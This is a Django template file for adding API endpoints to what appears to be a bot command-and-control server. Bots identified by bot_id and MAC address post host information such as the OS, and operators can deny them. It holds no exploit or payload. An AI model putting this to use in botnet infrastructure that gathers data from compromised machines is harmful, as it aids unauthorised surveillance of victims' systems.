############ START TEMPLATES FOR CREATING NEW FEATURES ###############
# YOUR-INFO-NAME is meant to be replaced in all of the templates

                    # CREATING AN API
# STEP 1: ADD AN API IN THE URLS.PY
    # replace YOUR-INFO-NAME with the type of information stored
url(r'^api/ADD_YOUR-INFO-NAME/$', views.ADD_YOUR-INFO-NAME),

# STEP 2: ADD A NEW SECTION IN VIEWS.PY hander() FUNCTION
    # YOUR-INFO-NAME info sent
if 'YOUR-INFO-NAME' in request.POST:
    add_YOUR-INFO-NAME(request, True, connectionObj)

# STEP 3: ADD add_YOUR-INFO-NAME()
#######################  START ADD_YOUR-INFO-NAME  ################################
# This function is utilized for the add_YOUR-INFO-NAME API. This function allows
# for the INFORMATION TO BE STORED to be added into the database for
# a corresponding system (mac_address)
# This API is also called by the handler API when os information is passed
@csrf_exempt
# mac_address, bot_id ip_address[optional], YOUR-INFO-NAME
def add_YOUR-INFO-NAME(request, connectionCounted=False, connObj=None):
    if(request.method == 'POST'):
        # parameters do not match
        if 'mac_address' not in request.POST or 'YOUR-INFO-NAME' not in request.POST or 'bot_id' not in request.POST:
            return HttpResponse(400)
        mac_address = request.POST['mac_address']
        YOUR-INFO-NAME = request.POST['YOUR-INFO-NAME']
        ip_address = 'xxx.xxx.xxx.xxx'

        # CHECK IF VALID BOT_ID
        bot_id = request.POST['bot_id']
        if(getBot(bot_id)==[]):
            return HttpResponse(400)
        else:
            # increment bot connection count
            if(not connectionCounted):
                botConnectIn(bot_id)
            # bot is not allowed to connect
            bot_info = getBot(bot_id)[0]
            if(not bot_info[4]):
                return HttpResponse('BOT DENIED')

        # check if an ip address was passed as a param
        if 'ip_address' in request.POST:
            if(isIpValid(request.POST['ip_address'])):
                ip_address = request.POST['ip_address']
        # add mac address if it is a new mac address
        if(getSystemInformation(mac_address)==None):
            # mac address is valid format
            if(isMacValid(mac_address)):
                insertSystemInformation(mac_address)
            else:
                return HttpResponse(400)
        # add connection if a connection does not already exist
        if(not connectionCounted):
            connObj = insertConnection(bot_id, mac_address,ip_address,'/api/add_YOUR-INFO-NAME/')
        # update os
        update_YOUR-INFO-NAME(mac_address, YOUR-INFO-NAME, connObj)
        return HttpResponse(200)
    else:
        return HttpResponse(400)
#######################  END ADD_YOUR-INFO-NAME  ###############################

                   # END CREATING AN API

############  END TEMPLATES FOR CREATING NEW FEATURES  ###############